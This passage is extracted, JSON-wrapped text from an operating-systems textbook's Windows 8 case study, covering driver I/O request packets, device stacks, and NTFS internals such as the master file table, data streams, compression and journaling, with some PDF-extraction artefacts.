of\r\nWDM and simplifies many of the more common requirements, mostly related to\r\ncorrect interaction with device power management and plug-and-play operations.\r\nTo further simplify driver writing, as well as increase the robustness of the sys\u0002tem, WDF includes the UMDF (User-Mode Driver Framework) for writing driv\u0002ers as services that execute in processes. And there is the KMDF (Kernel-Mode\nSEC. 11.7 INPUT/OUTPUT IN WINDOWS 949\r\nDriver Framework) for writing drivers as services that execute in the kernel, but\r\nwith many of the details of WDM made automagical. Since underneath it is the\r\nWDM that provides the driver model, that is what we will focus on in this section.\r\nDevices in Windows are represented by device objects. Device objects are also\r\nused to represent hardware, such as buses, as well as software abstractions like file\r\nsystems, network protocol engines, and kernel extensions, such as antivirus filter\r\ndrivers. All these are organized by producing what Windows calls a device stack,\r\nas previously shown in Fig. 11-14.\r\nI/O operations are initiated by the I/O manager calling an executive API\r\nIoCallDr iver with pointers to the top device object and to the IRP representing the\r\nI/O request. This routine finds the driver object associated with the device object.\r\nThe operation types that are specified in the IRP generally correspond to the I/O\r\nmanager system calls described above, such as create, read, and close.\r\nFigure 11-36 shows the relationships for a single level of the device stack. For\r\neach of these operations a driver must specify an entry point. IoCallDr iver takes the\r\noperation type out of the IRP, uses the device object at the current level of the de\u0002vice stack to find the driver object, and indexes into the driver dispatch table with\r\nthe operation type to find the corresponding entry point into the driver. The driver\r\nis then called and passed the device object and the IRP.\r\nDevice object\r\nInstance data\r\nNext device object\r\nDriver object Driver object\r\nDispatch table\r\nCREATE\r\nREAD\r\nWRITE\r\nFLUSH\r\nIOCTL\r\nCLEANUP\r\nCLOSE\r\n…\r\nLoaded device driver\r\nDriver code\r\nFigure 11-36. A single level in a device stack.\r\nOnce a driver has finished processing the request represented by the IRP, it has\r\nthree options. It can call IoCallDr iver again, passing the IRP and the next device\r\nobject in the device stack. It can declare the I/O request to be completed and re\u0002turn to its caller. Or it can queue the IRP internally and return to its caller, having\r\ndeclared that the I/O request is still pending. This latter case results in an asyn\u0002chronous I/O operation, at least if all the drivers above in the stack agree and also\r\nreturn to their callers.\n950 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nI/O Request Packets\r\nFigure 11-37 shows the major fields in the IRP. The bottom of the IRP is a dy\u0002namically sized array containing fields that can be used by each driver for the de\u0002vice stack handling the request. These stack fields also allow a driver to specify\r\nthe routine to call when completing an I/O request. During completion each level\r\nof the device stack is visited in reverse order, and the completion routine assigned\r\nby each driver is called in turn. At each level the driver can continue to complete\r\nthe request or decide there is still more work to do and leave the request pending,\r\nsuspending the I/O completion for the time being.\r\nKernel buffer address\r\nMDL\r\nThread\r\nIRP Driver-Stack Data\r\nCompletion/cancel info\r\nThread’s IRP chain link\r\nMemory descr list head\r\nUser buffer address\r\nBuffer pointers\r\nFlags\r\nMDL\r\nNext IRP\r\nCompletion\r\nAPC block\r\nDriver\r\nqueuing\r\n& comm.\r\nOperation code\r\nFigure 11-37. The major fields of an I/O Request Packet.\r\nWhen allocating an IRP, the I/O manager has to know how deep the particular\r\ndevice stack is so that it can allocate a sufficiently large IRP. It keeps track of the\r\nstack depth in a field in each device object as the device stack is formed. Note that\r\nthere is no formal definition of what the next device object is in any stack. That\r\ninformation is held in private data structures belonging to the previous driver on\r\nthe stack. In fact, the stack does not really have to be a stack at all. At any layer a\r\ndriver is free to allocate new IRPs, continue to use the original IRP, send an I/O op\u0002eration to a different device stack, or even switch to a system worker thread to con\u0002tinue execution.\r\nThe IRP contains flags, an operation code for indexing into the driver dispatch\r\ntable, buffer pointers for possibly both kernel and user buffers, and a list of MDLs\r\n(Memory Descriptor Lists) which are used to describe the physical pages repres\u0002ented by the buffers, that is, for DMA operations. There are fields used for cancel\u0002lation and completion operations. The fields in the IRP that are used to queue the\nSEC. 11.7 INPUT/OUTPUT IN WINDOWS 951\r\nIRP to devices while it is being processed are reused when the I/O operation has\r\nfinally completed to provide memory for the APC control object used to call the\r\nI/O manager’s completion routine in the context of the original thread. There is\r\nalso a link field used to link all the outstanding IRPs to the thread that initiated\r\nthem.\r\nDevice Stacks\r\nA driver in Windows may do all the work by itself, as the printer driver does in\r\nFig. 11-38. On the other hand, drivers may also be stacked, which means that a re\u0002quest may pass through a sequence of drivers, each doing part of the work. Two\r\nstacked drivers are also illustrated in Fig. 11-38.\r\nUser process\r\nUser\r\nprogram\r\nWin32\r\nRest of windows\r\nHardware abstraction layer\r\nController Controller Controller\r\nFilter\r\nFunction\r\nBus\r\nFunction\r\nMonolithic Bus\r\nDriver\r\nstack\r\nFigure 11-38. Windows allows drivers to be stacked to work with a specific in\u0002stance of a device. The stacking is represented by device objects.\r\nOne common use for stacked drivers is to separate the bus management from\r\nthe functional work of controlling the device. Bus management on the PCI bus is\r\nquite complicated on account of many kinds of modes and bus transactions. By\n952 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nseparating this work from the device-specific part, driver writers are freed from\r\nlearning how to control the bus. They can just use the standard bus driver in their\r\nstack. Similarly, USB and SCSI drivers have a device-specific part and a generic\r\npart, with common drivers being supplied by Windows for the generic part.\r\nAnother use of stacking drivers is to be able to insert filter drivers into the\r\nstack. We hav e already looked at the use of file-system filter drivers, which are in\u0002serted above the file system. Filter drivers are also used for managing physical\r\nhardware. A filter driver performs some transformation on the operations as the\r\nIRP flows down the device stack, as well as during the completion operation with\r\nthe IRP flows back up through the completion routines each driver specified. For\r\nexample, a filter driver could compress data on the way to the disk or encrypt data\r\non the way to the network. Putting the filter here means that neither the applica\u0002tion program nor the true device driver has to be aware of it, and it works automat\u0002ically for all data going to (or coming from) the device.\r\nKernel-mode device drivers are a serious problem for the reliability and stabil\u0002ity of Windows. Most of the kernel crashes in Windows are due to bugs in device\r\ndrivers. Because kernel-mode device drivers all share the same address space with\r\nthe kernel and executive layers, errors in the drivers can corrupt system data struc\u0002tures, or worse. Some of these bugs are due to the astonishingly large numbers of\r\ndevice drivers that exist for Windows, or to the development of drivers by less\u0002experienced system programmers. The bugs are also due to the enormous amount\r\nof detail involved in writing a correct driver for Windows.\r\nThe I/O model is powerful and flexible, but all I/O is fundamentally asynchro\u0002nous, so race conditions can abound. Windows 2000 added the plug-and-play and\r\ndevice power management facilities from the Win9x systems to the NT-based Win\u0002dows for the first time. This put a large number of requirements on drivers to deal\r\ncorrectly with devices coming and going while I/O packets are in the middle of\r\nbeing processed. Users of PCs frequently dock/undock devices, close the lid and\r\ntoss notebooks into briefcases, and generally do not worry about whether the little\r\ngreen activity light happens to still be on. Writing device drivers that function cor\u0002rectly in this environment can be very challenging, which is why WDF was devel\u0002oped to simplify the Windows Driver Model.\r\nMany books are available about the Windows Driver Model and the newer\r\nWindows Driver Foundation (Kanetkar, 2008; Orwick & Smith, 2007; Reeves,\r\n2010; Viscarola et al., 2007; and Vostokov, 2009)."
          }
        }
      },
      "11.8 THE WINDOWS NT FILE SYSTEM": {
        "page": 983,
        "children": {
          "11.8.1 Fundamental Concepts": {
            "page": 984,
            "content": "11.8.1 Fundamental Concepts\r\nIndividual file names in NTFS are limited to 255 characters; full paths are lim\u0002ited to 32,767 characters. File names are in Unicode, allowing people in countries\r\nnot using the Latin alphabet (e.g., Greece, Japan, India, Russia, and Israel) to write\r\nfile names in their native language. For example, φιλε is a perfectly legal file\r\nname. NTFS fully supports case-sensitive names (so foo is different from Foo and\r\nFOO). The Win32 API does not support case-sensitivity fully for file names and\r\nnot at all for directory names. The support for case sensitivity exists when running\r\nthe POSIX subsystem in order to maintain compatibility with UNIX. Win32 is not\r\ncase sensitive, but it is case preserving, so file names can have different case letters\r\nin them. Though case sensitivity is a feature that is very familiar to users of UNIX,\r\nit is largely inconvenient to ordinary users who do not make such distinctions nor\u0002mally. For example, the Internet is largely case-insensitive today.\r\nAn NTFS file is not just a linear sequence of bytes, as FAT -32 and UNIX files\r\nare. Instead, a file consists of multiple attributes, each represented by a stream of\r\nbytes. Most files have a few short streams, such as the name of the file and its\r\n64-bit object ID, plus one long (unnamed) stream with the data. However, a file\r\ncan also have two or more (long) data streams as well. Each stream has a name\r\nconsisting of the file name, a colon, and the stream name, as in foo:stream1. Each\r\nstream has its own size and is lockable independently of all the other streams. The\r\nidea of multiple streams in a file is not new in NTFS. The file system on the Apple\r\nMacintosh uses two streams per file, the data fork and the resource fork. The first\r\nuse of multiple streams for NTFS was to allow an NT file server to serve Macin\u0002tosh clients. Multiple data streams are also used to represent metadata about files,\r\nsuch as the thumbnail pictures of JPEG images that are available in the Windows\r\nGUI. But alas, the multiple data streams are fragile and frequently fall off files\r\nwhen they are transported to other file systems, transported over the network, or\r\nev en when backed up and later restored, because many utilities ignore them.\n954 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nNTFS is a hierarchical file system, similar to the UNIX file system. The sepa\u0002rator between component names is ‘‘ \\’’, howev er, instead of ‘‘/’’, a fossil inherited\r\nfrom the compatibility requirements with CP/M when MS-DOS was created\r\n(CP/M used the slash for flags). Unlike UNIX the concept of the current working\r\ndirectory, hard links to the current directory (.) and the parent directory (..) are im\u0002plemented as conventions rather than as a fundamental part of the file-system de\u0002sign. Hard links are supported, but used only for the POSIX subsystem, as is\r\nNTFS support for traversal checking on directories (the ‘x’ permission in UNIX).\r\nSymbolic links in are supported for NTFS. Creation of symbolic links is nor\u0002mally restricted to administrators to avoid security issues like spoofing, as UNIX\r\nexperienced when symbolic links were first introduced in 4.2BSD. The imple\u0002mentation of symbolic links uses an NTFS feature called reparse points (dis\u0002cussed later in this section). In addition, compression, encryption, fault tolerance,\r\njournaling, and sparse files are also supported. These features and their imple\u0002mentations will be discussed shortly."
          },
          "11.8.2 Implementation of the NT File System": {
            "page": 985,
            "content": "11.8.2 Implementation of the NT File System\r\nNTFS is a highly complex and sophisticated file system that was developed\r\nspecifically for NT as an alternative to the HPFS file system that had been devel\u0002oped for OS/2. While most of NT was designed on dry land, NTFS is unique\r\namong the components of the operating system in that much of its original design\r\ntook place aboard a sailboat out on the Puget Sound (following a strict protocol of\r\nwork in the morning, beer in the afternoon). Below we will examine a number of\r\nfeatures of NTFS, starting with its structure, then moving on to file-name lookup,\r\nfile compression, journaling, and file encryption.\r\nFile System Structure\r\nEach NTFS volume (e.g., disk partition) contains files, directories, bitmaps,\r\nand other data structures. Each volume is organized as a linear sequence of blocks\r\n(clusters in Microsoft’s terminology), with the block size being fixed for each vol\u0002ume and ranging from 512 bytes to 64 KB, depending on the volume size. Most\r\nNTFS disks use 4-KB blocks as a compromise between large blocks (for efficient\r\ntransfers) and small blocks (for low internal fragmentation). Blocks are referred to\r\nby their offset from the start of the volume using 64-bit numbers.\r\nThe principal data structure in each volume is the MFT (Master File Table),\r\nwhich is a linear sequence of fixed-size 1-KB records. Each MFT record describes\r\none file or one directory. It contains the file’s attributes, such as its name and time\u0002stamps, and the list of disk addresses where its blocks are located. If a file is ex\u0002tremely large, it is sometimes necessary to use two or more MFT records to con\u0002tain the list of all the blocks, in which case the first MFT record, called the base\r\nrecord, points to the additional MFT records. This overflow scheme dates back to\nSEC. 11.8 THE WINDOWS NT FILE SYSTEM 955\r\nCP/M, where each directory entry was called an extent. A bitmap keeps track of\r\nwhich MFT entries are free.\r\nThe MFT is itself a file and as such can be placed anywhere within the volume,\r\nthus eliminating the problem with defective sectors in the first track. Furthermore,\r\nthe file can grow as needed, up to a maximum size of 248 records.\r\nThe MFT is shown in Fig. 11-39. Each MFT record consists of a sequence of\r\n(attribute header, value) pairs. Each attribute begins with a header telling which\r\nattribute this is and how long the value is. Some attribute values are variable\r\nlength, such as the file name and the data. If the attribute value is short enough to\r\nfit in the MFT record, it is placed there. If it is too long, it is placed elsewhere on\r\nthe disk and a pointer to it is placed in the MFT record. This makes NTFS very ef\u0002ficient for small files, that is, those that can fit within the MFT record itself.\r\nThe first 16 MFT records are reserved for NTFS metadata files, as illustrated\r\nin Fig. 11-39. Each record describes a normal file that has attributes and data\r\nblocks, just like any other file. Each of these files has a name that begins with a\r\ndollar sign to indicate that it is a metadata file. The first record describes the MFT\r\nfile itself. In particular, it tells where the blocks of the MFT file are located so that\r\nthe system can find the MFT file. Clearly, Windows needs a way to find the first\r\nblock of the MFT file in order to find the rest of the file-system information. The\r\nway it finds the first block of the MFT file is to look in the boot block, where its\r\naddress is installed when the volume is formatted with the file system.\r\n \r\n16\r\n15\r\n14\r\n13\r\n12\r\n11\r\n10\r\n9\r\n8\r\n7\r\n6\r\n5\r\n4\r\n3\r\n2\r\n1\r\n0\r\nMetadata files\r\n1 KB\r\nFirst user file\r\n(Reserved for future use)\r\n(Reserved for future use)\r\n(Reserved for future use)\r\n(Reserved for future use)\r\n$Extend Extentions: quotas,etc\r\n$Upcase Case conversion table\r\n$Secure Security descriptors for all files\r\n$BadClus List of bad blocks\r\n$Boot Bootstrap loader\r\n$Bitmap Bitmap of blocks used\r\n$ Root directory\r\n$AttrDef Attribute definitions\r\n$Volume Volume file\r\n$LogFile Log file to recovery\r\n$MftMirr Mirror copy of MFT\r\n$Mft Master File Table\r\nFigure 11-39. The NTFS master file table.\n956 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nRecord 1 is a duplicate of the early portion of the MFT file. This information\r\nis so precious that having a second copy can be critical in the event one of the first\r\nblocks of the MFT ever becomes unreadable. Record 2 is the log file. When struc\u0002tural changes are made to the file system, such as adding a new directory or remov\u0002ing an existing one, the action is logged here before it is performed, in order to in\u0002crease the chance of correct recovery in the event of a failure during the operation,\r\nsuch as a system crash. Changes to file attributes are also logged here. In fact, the\r\nonly changes not logged here are changes to user data. Record 3 contains infor\u0002mation about the volume, such as its size, label, and version.\r\nAs mentioned above, each MFT record contains a sequence of (attribute head\u0002er, value) pairs. The $AttrDef file is where the attributes are defined. Information\r\nabout this file is in MFT record 4. Next comes the root directory, which itself is a\r\nfile and can grow to arbitrary length. It is described by MFT record 5.\r\nFree space on the volume is kept track of with a bitmap. The bitmap is itself a\r\nfile, and its attributes and disk addresses are given in MFT record 6. The next\r\nMFT record points to the bootstrap loader file. Record 8 is used to link all the bad\r\nblocks together to make sure they nev er occur in a file. Record 9 contains the se\u0002curity information. Record 10 is used for case mapping. For the Latin letters A-Z\r\ncase mapping is obvious (at least for people who speak Latin). Case mapping for\r\nother languages, such as Greek, Armenian, or Georgian (the country, not the state),\r\nis less obvious to Latin speakers, so this file tells how to do it. Finally, record 11 is\r\na directory containing miscellaneous files for things like disk quotas, object identi\u0002fiers, reparse points, and so on. The last four MFT records are reserved for future\r\nuse.\r\nEach MFT record consists of a record header followed by the (attribute header,\r\nvalue) pairs. The record header contains a magic number used for validity check\u0002ing, a sequence number updated each time the record is reused for a new file, a\r\ncount of references to the file, the actual number of bytes in the record used, the\r\nidentifier (index, sequence number) of the base record (used only for extension\r\nrecords), and some other miscellaneous fields.\r\nNTFS defines 13 attributes that can appear in MFT records. These are listed in\r\nFig. 11-40. Each attribute header identifies the attribute and gives the length and\r\nlocation of the value field along with a variety of flags and other information.\r\nUsually, attribute values follow their attribute headers directly, but if a value is too\r\nlong to fit in the MFT record, it may be put in separate disk blocks. Such an\r\nattribute is said to be a nonresident attribute. The data attribute is an obvious\r\ncandidate. Some attributes, such as the name, may be repeated, but all attributes\r\nmust appear in a fixed order in the MFT record. The headers for resident attributes\r\nare 24 bytes long; those for nonresident attributes are longer because they contain\r\ninformation about where to find the attribute on disk.\r\nThe standard information field contains the file owner, security information,\r\nthe timestamps needed by POSIX, the hard-link count, the read-only and archive\r\nbits, and so on. It is a fixed-length field and is always present. The file name is a\nSEC. 11.8 THE WINDOWS NT FILE SYSTEM 957\r\nAttribute Description\r\nStandard infor mation Flag bits, timestamps, etc.\r\nFile name File name in Unicode; may be repeated for MS-DOS name\r\nSecur ity descr iptor Obsolete. Secur ity infor mation is now in $Extend$Secure\r\nAttr ibute list Location of additional MFT records, if needed\r\nObject ID 64-bit file identifier unique to this volume\r\nReparse point Used for mounting and symbolic links\r\nVolume name Name of this volume (used only in $Volume)\r\nVolume infor mation Volume version (used only in $Volume)\r\nIndex root Used for director ies\r\nIndex allocation Used for ver y large directories\r\nBitmap Used for ver y large directories\r\nLogged utility stream Controls logging to $LogFile\r\nData Stream data; may be repeated\r\nFigure 11-40. The attributes used in MFT records.\r\nvariable-length Unicode string. In order to make files with non–MS-DOS names\r\naccessible to old 16-bit programs, files can also have an 8 + 3 MS-DOS short\r\nname. If the actual file name conforms to the MS-DOS 8 + 3 naming rule, a sec\u0002ondary MS-DOS name is not needed.\r\nIn NT 4.0, security information was put in an attribute, but in Windows 2000\r\nand later, security information all goes into a single file so that multiple files can\r\nshare the same security descriptions. This results in significant savings in space\r\nwithin most MFT records and in the file system overall because the security info\r\nfor so many of the files owned by each user is identical.\r\nThe attribute list is needed in case the attributes do not fit in the MFT record.\r\nThis attribute then tells where to find the extension records. Each entry in the list\r\ncontains a 48-bit index into the MFT telling where the extension record is and a\r\n16-bit sequence number to allow verification that the extension record and base\r\nrecords match up.\r\nNTFS files have an ID associated with them that is like the i-node number in\r\nUNIX. Files can be opened by ID, but the IDs assigned by NTFS are not always\r\nuseful when the ID must be persisted because it is based on the MFT record and\r\ncan change if the record for the file moves (e.g., if the file is restored from backup).\r\nNTFS allows a separate object ID attribute which can be set on a file and never\r\nneeds to change. It can be kept with the file if it is copied to a new volume, for ex\u0002ample.\r\nThe reparse point tells the procedure parsing the file name that it has do some\u0002thing special. This mechanism is used for explicitly mounting file systems and for\r\nsymbolic links. The two volume attributes are used only for volume identification.\n958 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nThe next three attributes deal with how directories are implemented. Small ones\r\nare just lists of files but large ones are implemented using B+ trees. The logged\r\nutility stream attribute is used by the encrypting file system.\r\nFinally, we come to the attribute that is the most important of all: the data\r\nstream (or in some cases, streams). An NTFS file has one or more data streams as\u0002sociated with it. This is where the payload is. The default data stream is\r\nunnamed (i.e., dirpath \\ file name::$DATA), but the alternate data streams each\r\nhave a name, for example, dirpath \\ file name:streamname:$DATA.\r\nFor each stream, the stream name, if present, goes in this attribute header. Fol\u0002lowing the header is either a list of disk addresses telling which blocks the stream\r\ncontains, or for streams of only a few hundred bytes (and there are many of these),\r\nthe stream itself. Putting the actual stream data in the MFT record is called an\r\nimmediate file (Mullender and Tanenbaum, 1984).\r\nOf course, most of the time the data does not fit in the MFT record, so this\r\nattribute is usually nonresident. Let us now take a look at how NTFS keeps track\r\nof the location of nonresident attributes, in particular data.\r\nStorage Allocation\r\nThe model for keeping track of disk blocks is that they are assigned in runs of\r\nconsecutive blocks, where possible, for efficiency reasons. For example, if the first\r\nlogical block of a stream is placed in block 20 on the disk, then the system will try\r\nhard to place the second logical block in block 21, the third logical block in 22,\r\nand so on. One way to achieve these runs is to allocate disk storage several blocks\r\nat a time, when possible.\r\nThe blocks in a stream are described by a sequence of records, each one\r\ndescribing a sequence of logically contiguous blocks. For a stream with no holes\r\nin it, there will be only one such record. Streams that are written in order from be\u0002ginning to end all belong in this category. For a stream with one hole in it (e.g.,\r\nonly blocks 0–49 and blocks 60–79 are defined), there will be two records. Such a\r\nstream could be produced by writing the first 50 blocks, then seeking forward to\r\nlogical block 60 and writing another 20 blocks. When a hole is read back, all the\r\nmissing bytes are zeros. Files with holes are called sparse files.\r\nEach record begins with a header giving the offset of the first block within the\r\nstream. Next comes the offset of the first block not covered by the record. In the\r\nexample above, the first record would have a header of (0, 50) and would provide\r\nthe disk addresses for these 50 blocks. The second one would have a header of\r\n(60, 80) and would provide the disk addresses for these 20 blocks.\r\nEach record header is followed by one or more pairs, each giving a disk ad\u0002dress and run length. The disk address is the offset of the disk block from the start\r\nof its partition; the run length is the number of blocks in the run. As many pairs as\r\nneeded can be in the run record. Use of this scheme for a three-run, nine-block\r\nstream is illustrated in Fig. 11-41.\nSEC. 11.8 THE WINDOWS NT FILE SYSTEM 959\r\n \r\nStandard\r\ninfo header\r\nFile name\r\nheader\r\nData\r\nheader\r\nInfo about data blocks\r\nRun #1 Run #2 Run #3\r\nStandard\r\ninfo File name 0 9 20 4 64 2 80 3 Unused\r\nDisk blocks\r\nBlocks numbers 20-23 64-65 80-82\r\nMTF\r\nrecord\r\nRecord\r\nheader\r\nHeader\r\nFigure 11-41. An MFT record for a three-run, nine-block stream.\r\nIn this figure we have an MFT record for a short stream of nine blocks (header\r\n0–8). It consists of the three runs of consecutive blocks on the disk. The first run\r\nis blocks 20–23, the second is blocks 64–65, and the third is blocks 80–82. Each\r\nof these runs is recorded in the MFT record as a (disk address, block count) pair.\r\nHow many runs there are depends on how well the disk block allocator did in find\u0002ing runs of consecutive blocks when the stream was created. For an n-block\r\nstream, the number of runs can be anything from 1 through n.\r\nSeveral comments are worth making here. First, there is no upper limit to the\r\nsize of streams that can be represented this way. In the absence of address com\u0002pression, each pair requires two 64-bit numbers in the pair for a total of 16 bytes.\r\nHowever, a pair could represent 1 million or more consecutive disk blocks. In fact,\r\na 20-MB stream consisting of 20 separate runs of 1 million 1-KB blocks each fits\r\neasily in one MFT record, whereas a 60-KB stream scattered into 60 isolated\r\nblocks does not.\r\nSecond, while the straightforward way of representing each pair takes 2 × 8\r\nbytes, a compression method is available to reduce the size of the pairs below 16.\r\nMany disk addresses have multiple high-order zero-bytes. These can be omitted.\r\nThe data header tells how many are omitted, that is, how many bytes are actually\r\nused per address. Other kinds of compression are also used. In practice, the pairs\r\nare often only 4 bytes.\r\nOur first example was easy: all the file information fit in one MFT record.\r\nWhat happens if the file is so large or highly fragmented that the block information\r\ndoes not fit in one MFT record? The answer is simple: use two or more MFT\r\nrecords. In Fig. 11-42 we see a file whose base record is in MFT record 102. It\r\nhas too many runs for one MFT record, so it computes how many extension\r\nrecords it needs, say, two, and puts their indices in the base record. The rest of the\r\nrecord is used for the first k data runs.\n960 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\n109\r\n108\r\n106\r\n105\r\n103\r\n102\r\n100\r\nRun #m+1 Run n\r\nRun #k+1 Run m\r\nMFT 105 MFT 108 Run #k Run #1\r\nSecond extension record\r\nFirst extension record\r\nBase record\r\n101\r\n104\r\n107\r\nFigure 11-42. A file that requires three MFT records to store all its runs.\r\nNote that Fig. 11-42 contains some redundancy. In theory, it should not be\r\nnecessary to specify the end of a sequence of runs because this information can be\r\ncalculated from the run pairs. The reason for ‘‘overspecifying’’ this information is\r\nto make seeking more efficient: to find the block at a given file offset, it is neces\u0002sary to examine only the record headers, not the run pairs.\r\nWhen all the space in record 102 has been used up, storage of the runs con\u0002tinues with MFT record 105. As many runs are packed in this record as fit. When\r\nthis record is also full, the rest of the runs go in MFT record 108. In this way,\r\nmany MFT records can be used to handle large fragmented files.\r\nA problem arises if so many MFT records are needed that there is no room in\r\nthe base MFT to list all their indices. There is also a solution to this problem: the\r\nlist of extension MFT records is made nonresident (i.e., stored in other disk blocks\r\ninstead of in the base MFT record). Then it can grow as large as needed.\r\nAn MFT entry for a small directory is shown in Fig. 11-43. The record con\u0002tains a number of directory entries, each of which describes one file or directory.\r\nEach entry has a fixed-length structure followed by a variable-length file name.\r\nThe fixed part contains the index of the MFT entry for the file, the length of the file\r\nname, and a variety of other fields and flags. Looking for an entry in a directory\r\nconsists of examining all the file names in turn.\r\nLarge directories use a different format. Instead, of listing the files linearly, a\r\nB+ tree is used to make alphabetical lookup possible and to make it easy to insert\r\nnew names in the directory in the proper place.\r\nThe NTFS parsing of the path \\ foo \\ bar begins at the root directory for C:,\r\nwhose blocks can be found from entry 5 in the MFT (see Fig. 11-39). The string\r\n‘‘foo’’ is looked up in the root directory, which returns the index into the MFT for\r\nthe directory foo. This directory is then searched for the string ‘‘bar’’, which refers\r\nto the MFT record for this file. NTFS performs access checks by calling back into\r\nthe security reference monitor, and if everything is cool it searches the MFT record\r\nfor the attribute ::$DATA, which is the default data stream.\nSEC. 11.8 THE WINDOWS NT FILE SYSTEM 961\r\n \r\nStandard\r\ninfo header\r\nIndex root\r\nheader\r\nStandard\r\ninfo Unused\r\nRecord\r\nheader\r\nA directory entry contains the MFT index for the file, \r\nthe length of the file name, the file name itself, \r\nand various fields and flags\r\nFigure 11-43. The MFT record for a small directory.\r\nWe now hav e enough information to finish describing how file-name lookup occurs for\r\na file \\ ?? \\ C: \\ foo \\ bar. In Fig. 11-20 we saw how the Win32, the native NT system calls,\r\nand the object and I/O managers cooperated to open a file by sending an I/O request to the\r\nNTFS device stack for the C: volume. The I/O request asks NTFS to fill in a file object for\r\nthe remaining path name, \\ foo \\ bar.\r\nHaving found file bar, NTFS will set pointers to its own metadata in the file\r\nobject passed down from the I/O manager. The metadata includes a pointer to the\r\nMFT record, information about compression and range locks, various details about\r\nsharing, and so on. Most of this metadata is in data structures shared across all file\r\nobjects referring to the file. A few fields are specific only to the current open, such\r\nas whether the file should be deleted when it is closed. Once the open has suc\u0002ceeded, NTFS calls IoCompleteRequest to pass the IRP back up the I/O stack to\r\nthe I/O and object managers. Ultimately a handle for the file object is put in the\r\nhandle table for the current process, and control is passed back to user mode. On\r\nsubsequent ReadFile calls, an application can provide the handle, specifying that\r\nthis file object for C: \\ foo \\ bar should be included in the read request that gets pas\u0002sed down the C: device stack to NTFS.\r\nIn addition to regular files and directories, NTFS supports hard links in the\r\nUNIX sense, and also symbolic links using a mechanism called reparse points.\r\nNTFS supports tagging a file or directory as a reparse point and associating a block\r\nof data with it. When the file or directory is encountered during a file-name parse,\r\nthe operation fails and the block of data is returned to the object manager. The ob\u0002ject manager can interpret the data as representing an alternative path name and\r\nthen update the string to parse and retry the I/O operation. This mechanism is used\r\nto support both symbolic links and mounted file systems, redirecting the search to\r\na different part of the directory hierarchy or even to a different partition.\r\nReparse points are also used to tag individual files for file-system filter drivers.\r\nIn Fig. 11-20 we showed how file-system filters can be installed between the I/O\r\nmanager and the file system. I/O requests are completed by calling IoComplete\u0002Request, which passes control to the completion routines each driver represented\n962 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nin the device stack inserted into the IRP as the request was being made. A driver\r\nthat wants to tag a file associates a reparse tag and then watches for completion re\u0002quests for file open operations that failed because they encountered a reparse point.\r\nFrom the block of data that is passed back with the IRP, the driver can tell if this is\r\na block of data that the driver itself has associated with the file. If so, the driver\r\nwill stop processing the completion and continue processing the original I/O re\u0002quest. Generally, this will involve proceeding with the open request, but there is a\r\nflag that tells NTFS to ignore the reparse point and open the file.\r\nFile Compression\r\nNTFS supports transparent file compression. A file can be created in com\u0002pressed mode, which means that NTFS automatically tries to compress the blocks\r\nas they are written to disk and automatically uncompresses them when they are\r\nread back. Processes that read or write compressed files are completely unaware\r\nthat compression and decompression are going on.\r\nCompression works as follows. When NTFS writes a file marked for compres\u0002sion to disk, it examines the first 16 (logical) blocks in the file, irrespective of how\r\nmany runs they occupy. It then runs a compression algorithm on them. If the re\u0002sulting compressed data can be stored in 15 or fewer blocks, they are written to the\r\ndisk, preferably in one run, if possible. If the compressed data still take 16 blocks,\r\nthe 16 blocks are written in uncompressed form. Then blocks 16–31 are examined\r\nto see if they can be compressed to 15 blocks or fewer, and so on.\r\nFigure 11-44(a) shows a file in which the first 16 blocks have successfully\r\ncompressed to eight blocks, the second 16 blocks failed to compress, and the third\r\n16 blocks have also compressed by 50%. The three parts have been written as\r\nthree runs and stored in the MFT record. The ‘‘missing’’ blocks are stored in the\r\nMFT entry with disk address 0 as shown in Fig. 11-44(b). Here the header (0, 48)\r\nis followed by fiv e pairs, two for the first (compressed) run, one for the uncom\u0002pressed run, and two for the final (compressed) run.\r\nWhen the file is read back, NTFS has to know which runs are compressed and\r\nwhich ones are not. It can tell based on the disk addresses. A disk address of 0 in\u0002dicates that it is the final part of 16 compressed blocks. Disk block 0 may not be\r\nused for storing data, to avoid ambiguity. Since block 0 on the volume contains the\r\nboot sector, using it for data is impossible anyway.\r\nRandom access to compressed files is actually possible, but tricky. Suppose\r\nthat a process does a seek to block 35 in Fig. 11-44. How does NTFS locate block\r\n35 in a compressed file? The answer is that it has to read and decompress the en\u0002tire run first. Then it knows where block 35 is and can pass it to any process that\r\nreads it. The choice of 16 blocks for the compression unit was a compromise.\r\nMaking it shorter would have made the compression less effective. Making it\r\nlonger would have made random access more expensive.\nSEC. 11.8 THE WINDOWS NT FILE SYSTEM 963\r\nCompressed\r\n0 16 32 47\r\n0 7\r\n30 37\r\n24 31\r\n85\r\n8\r\n40 92\r\n23\r\nDisk addr 55\r\nOriginal uncompressed file\r\nUncompressed Compressed\r\n Standard\r\ninfo File name 0 48 30 8 0 8 40 16 85\r\n(a)\r\n(b)\r\n8 0 8 Unused\r\nHeader Five runs (of which two empties)\r\nFigure 11-44. (a) An example of a 48-block file being compressed to 32 blocks.\r\n(b) The MFT record for the file after compression.\r\nJournaling\r\nNTFS supports two mechanisms for programs to detect changes to files and di\u0002rectories. First is an operation, NtNotifyChangeDirector yFile, that passes a buffer\r\nand returns when a change is detected to a directory or directory subtree. The re\u0002sult is that the buffer has a list of change records. If it is too small, records are lost.\r\nThe second mechanism is the NTFS change journal. NTFS keeps a list of all\r\nthe change records for directories and files on the volume in a special file, which\r\nprograms can read using special file-system control operations, that is, the\r\nFSCTL QUERY USN JOURNAL option to the NtFsControlFile API. The journal\r\nfile is normally very large, and there is little likelihood that entries will be reused\r\nbefore they can be examined.\r\nFile Encryption\r\nComputers are used nowadays to store all kinds of sensitive data, including\r\nplans for corporate takeovers, tax information, and love letters, which the owners\r\ndo not especially want revealed to anyone. Information loss can happen when a\r\nnotebook computer is lost or stolen, a desktop system is rebooted using an MS\u0002DOS floppy disk to bypass Windows security, or a hard disk is physically removed\r\nfrom one computer and installed on another one with an insecure operating system.\r\nWindows addresses these problems by providing an option to encrypt files, so\r\nthat even in the event the computer is stolen or rebooted using MS-DOS, the files\r\nwill be unreadable. The normal way to use Windows encryption is to mark certain\r\ndirectories as encrypted, which causes all the files in them to be encrypted, and\n964 CASE STUDY 2: WINDOWS 8 CHAP. 